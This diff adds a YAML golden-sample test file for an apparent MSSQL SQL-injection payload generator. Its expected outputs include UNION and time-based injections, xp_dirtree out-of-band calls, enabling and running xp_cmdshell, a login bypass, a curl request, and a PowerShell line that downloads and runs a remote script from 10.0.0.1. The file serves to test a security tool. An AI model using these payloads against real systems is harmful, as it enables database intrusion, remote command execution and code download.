@@ -1,0 +1,148 @@
+# MSSQL 黄金样本（§13.2）
+#
+# 这组样本的重点是**变量落在模板引号字面量内**的情况——MSSQL 的 xp_cmdshell
+# 是第一个「载荷文本是 T-SQL、效果却是执行系统命令」的模板，跨内容类型组合时
+# 内层载荷的引号会提前闭合外层字面量。SQL 没有可靠 parser，这类损坏是静默的，
+# 所以必须靠提示兜住。
+
+ruleDB: v0.1.0
+
+samples:
+  # ---------- 基本 ----------
+
+  - name: sqli.mssql.detect.version · 版本回显
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.detect.version
+      outputs: [raw]
+    expect:
+      # body 里 <<comment>> 前有一个空格，注释符本身是 --
+      payload: "' UNION SELECT @@version,2,3 --"
+
+  - name: sqli.mssql.union.basic · 联合查询默认槽位
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.basic
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3 --"
+
+  - name: 时间盲注（槽位 + 变量）
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.time.waitfor
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
+
+  - name: 带外 UNC 路径的反斜杠
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.oob.dirtree
+      vars: {lhost: "10.0.0.1", share: "a"}
+      outputs: [raw]
+    expect:
+      payload: "'; EXEC master..xp_dirtree '\\\\10.0.0.1\\a'--"
+
+  # ---------- 命令执行：载荷是 T-SQL，效果是系统命令 ----------
+
+  - name: xp_cmdshell 启用
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.xp_cmdshell.enable
+      outputs: [raw]
+    expect:
+      payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
+
+  - name: xp_cmdshell 执行命令
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.xp_cmdshell.exec
+      vars: {cmd: "net user"}
+      outputs: [raw]
+    expect:
+      payload: "'; EXEC xp_cmdshell 'net user'--"
+
+  - name: skip_quoted 保住 xp_cmdshell 命令字面量里的空格
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.xp_cmdshell.exec
+      vars: {cmd: "net user"}
+      bypasses: [bypass.space.plus]
+      outputs: [raw]
+    expect:
+      # xp_cmdshell 与字面量之间的空格被替换，'net user' 里的那个保住
+      payload: "';+EXEC+xp_cmdshell+'net user'--"
+
+  # ---------- 变量落在引号字面量内：静默截断必须提示 ----------
+
+  - name: 变量值含单引号且落在 '...' 字面量内 → 提示
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.xp_cmdshell.exec
+      # 模拟跨内容类型组合：内层 PowerShell 载荷里带 'http://...'
+      vars: {cmd: "powershell -c \"IEX('http://10.0.0.1/a.ps1')\""}
+      outputs: [raw]
+    expect:
+      checks_count: 1
+
+  - name: 变量值不含引号 → 不提示
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.xp_cmdshell.exec
+      vars: {cmd: "whoami"}
+      outputs: [raw]
+    expect:
+      payload: "'; EXEC xp_cmdshell 'whoami'--"
+      checks_count: 0
+
+  - name: 变量不在引号内时含引号不误报
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.cmd.raw
+      vars: {cmd: "echo 'hi'"}
+      outputs: [raw]
+    expect:
+      payload: "echo 'hi'"
+      checks_count: 0
+
+  # ---------- 认证绕过 ----------
+
+  - name: sqli.mssql.auth.bypass · 登录绕过
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.auth.bypass
+      outputs: [raw]
+    expect:
+      payload: "' OR 1=1--"
+
+  # ---------- 报错注入走 curl ----------
+
+  - name: 报错注入 curl 输出
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.error.convert
+      vars: {expr: "@@version"}
+      submit: query
+      host: db.test
+      path: /item
+      param: id
+      method: GET
+      shell: bash
+      outputs: [curl]
+    expect:
+      outputs:
+        curl: "curl 'http://db.test/item?id=%27%20AND%201%3DCONVERT%28int%2C%28%40%40version%29%29%20--'"
